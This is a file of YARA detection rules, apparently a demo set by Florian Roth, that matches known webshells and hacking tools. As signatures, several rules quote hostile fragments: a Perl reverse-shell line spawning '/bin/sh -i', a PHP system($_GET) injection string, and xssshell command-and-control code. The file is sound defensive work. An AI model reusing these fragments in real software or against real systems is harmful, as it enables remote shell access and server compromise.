rule Webshell_BackDooR__fr__RID2F80 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file BackDooR (fr).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:59:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include " 
   condition: 
      all of them
}

rule Webshell_FSO_s_ntdaddy_RID2FA7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ntdaddy.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s" 
   condition: 
      all of them
}

rule Webshell_stview_nstview_RID30B7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file nstview.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" 
   condition: 
      all of them
}

rule Webshell_HYTop_DevPack_upload_RID325B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file upload.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- PageUpload Below -->" 
   condition: 
      all of them
}

rule HKTL_PasswordReminder_RID2F2C : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PasswordReminder.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "The encoded password is found at 0x%8.8lx and has a length of %d." 
   condition: 
      all of them
}

rule Webshell_FSO_s_RemExp_2_RID2FA1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = " Then Response.Write \"" 
      $s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>" 
   condition: 
      all of them
}

rule Webshell_FSO_s_c99_RID2D94 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file c99.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce" 
   condition: 
      all of them
}

rule HKTL_dbgntboot_RID2C66 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dbgntboot.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp" 
      $s3 = "sth junk the M$ Wind0wZ retur" 
   condition: 
      all of them
}

rule Webshell_PHP_shell_RID2E05 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz" 
      $s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s" 
   condition: 
      all of them
}

rule HKTL_hxdef100_RID2B43 : DEMO HKTL T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hxdef100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 08:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "RtlAnsiStringToUnicodeString" 
      $s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" 
      $s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH" 
   condition: 
      all of them
}

rule HKTL_rdrbs100_RID2B51 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file rdrbs100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:01:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "Server address must be IP in A.B.C.D format." 
      $s4 = " mapped ports in the list. Currently " 
   condition: 
      all of them
}

rule HKTL_hxdef100_2_RID2BD4 : DEMO HKTL T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hxdef100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\\\.\\mailslot\\hxdef-rkc000" 
      $s2 = "Shared Components\\On Access Scanner\\BehaviourBlo" 
      $s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" 
   condition: 
      all of them
}

rule Webshell_webadmin_RID2DED : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file webadmin.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu" 
   condition: 
      all of them
}

rule Webshell_ASP_commands_RID2F3B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file commands.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID" 
      $s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F" 
   condition: 
      all of them
}

rule HKTL_hkdoordll_RID2C66 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hkdoordll.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is" 
   condition: 
      all of them
}

rule Webshell_r57shell_2_RID2E2D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_" 
   condition: 
      all of them
}

rule HKTL_Mithril_v1_45_dllTest_RID3085 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "syspath" 
      $s4 = "\\Mithril" 
      $s5 = "--list the services in the computer" 
   condition: 
      all of them
}

rule HKTL_dbgiis6cli_RID2C83 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dbgiis6cli.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" 
      $s5 = "###command:(NO more than 100 bytes!)" 
   condition: 
      all of them
}

rule Webshell_remview_2003_04_22_RID304F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file remview_2003_04_22.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\"" 
   condition: 
      all of them
}

rule Webshell_FSO_s_test_RID2E7F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file test.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$yazi = \"test\" . \"\\r\\n\";" 
      $s2 = "fwrite ($fp, \"$yazi\");" 
   condition: 
      all of them
}

rule HKTL_Debug_cress_RID2D09 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file cress.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Mithril " 
      $s4 = "Mithril.exe" 
   condition: 
      all of them
}

rule Webshell_RhV_webshell_RID2F6B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file webshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "RhViRYOzz" 
      $s1 = "d\\O!jWW" 
      $s2 = "bc!jWW" 
      $s3 = "0W[&{l" 
      $s4 = "[INhQ@\\" 
   condition: 
      all of them
}

rule Webshell_thelast_index3_RID3045 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file index3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r" 
   condition: 
      all of them
}

rule Webshell_HYTop_AppPack_2005_RID309F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:47:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb" 
   condition: 
      all of them
}

rule Webshell_xssshell_RID2E1C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file xssshell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:00:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_usr_RID353E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file usr.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 16:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phpinj_RID2F48 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpinj.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" 
   condition: 
      all of them
}

rule Webshell_xssshell_db_RID2F41 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file db.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:49:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com" 
   condition: 
      all of them
}

rule Webshell_PHP_sh_RID2CC8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file sh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"@$SERVER_NAME \".exec(\"pwd\")" 
   condition: 
      all of them
}

rule Webshell_xssshell_default_RID3160 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file default.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")" 
   condition: 
      all of them
}

rule HKTL_EditServer_2_RID2D31 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file EditServer.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@HOTMAIL.COM" 
      $s1 = "Press Any Ke" 
      $s3 = "glish MenuZ" 
   condition: 
      all of them
}

rule HKTL_by064cli_RID2B50 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file by064cli.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "packet dropped,redirecting" 
      $s9 = "input the password(the default one is 'by')" 
   condition: 
      all of them
}

rule HKTL_Mithril_dllTest_RID2EB7 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "please enter the password:" 
      $s3 = "\\dllTest.pdb" 
   condition: 
      all of them
}

rule Webshell_fmlibraryv3_RID2F17 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file fmlibraryv3.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:42:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER" 
   condition: 
      all of them
}

rule HKTL_Debug_dllTest_2_RID2E56 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "\\Debug\\dllTest.pdb" 
      $s5 = "--list the services in the computer" 
   condition: 
      all of them
}

rule Webshell_connector_ASP_RID2FB4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file connector.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:08:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "If ( AttackID = BROADCAST_ATTACK )" 
      $s4 = "Add UNIQUE ID for victims / zombies" 
   condition: 
      all of them
}

rule HKTL_shelltools_g0t_root_HideRun_RID3387 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file HideRun.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:51:41"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Usage -- hiderun [AppName]" 
      $s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997." 
   condition: 
      all of them
}

rule Webshell_PHP_Shell_v1_7_RID2F81 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]" 
   condition: 
      all of them
}

rule Webshell_xssshell_save_RID302A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file save.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID" 
      $s5 = "VictimID = fm_NStr(Victims(i))" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phpinj_2_RID2FD9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpinj.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO" 
   condition: 
      all of them
}

rule Webshell_FSO_s_ajan_RID2E59 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "entrika.write \"BinaryStream.SaveToFile" 
   condition: 
      all of them
}

rule Webshell_c99shell_RID2D93 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&" 
   condition: 
      all of them
}

rule Webshell_phpspy_2005_full_RID3082 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpspy_2005_full.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco" 
   condition: 
      all of them
}

rule Webshell_FSO_s_zehir4_2_RID2FA6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "\"Program Files\\Serv-u\\Serv" 
   condition: 
      all of them
}

rule Webshell_FSO_s_indexer_2_RID303F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file indexer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>" 
   condition: 
      all of them
}

rule Webshell_HYTop_DevPack_2005_RID309D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:47:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")" 
      $s8 = "scrollbar-darkshadow-color:#9C9CD3;" 
      $s9 = "scrollbar-face-color:#E4E4F3;" 
   condition: 
      all of them
}

rule HKTL_root_040_zip_Folder_deploy_RID32B3 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file deploy.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:16:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "halon synscan 127.0.0.1 1-65536" 
      $s8 = "Obviously you replace the ip address with that of the target." 
   condition: 
      all of them
}

rule HKTL_by063cli_RID2B4F : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file by063cli.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:01:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "#popmsghello,are you all right?" 
      $s4 = "connect failed,check your network and remote ip." 
   condition: 
      all of them
}

rule HKTL_byshell063_ntboot_2_RID2FB5 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ntboot.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:08:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)" 
   condition: 
      all of them
}

rule HKTL_u_uay_RID2AC6 : DEMO HKTL T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file uay.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 08:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe" 
      $s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security" 
   condition: 
      1 of them
}

rule HKTL_pwreveal_RID2C09 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file pwreveal.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "*<Blank - no es" 
      $s3 = "JDiamondCS " 
      $s8 = "sword set> [Leith=0 bytes]" 
      $s9 = "ION\\System\\Floating-" 
   condition: 
      all of them
}

rule HKTL_vanquish_2_RID2CA3 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file vanquish.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:57:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Vanquish - DLL injection failed:" 
   condition: 
      all of them
}

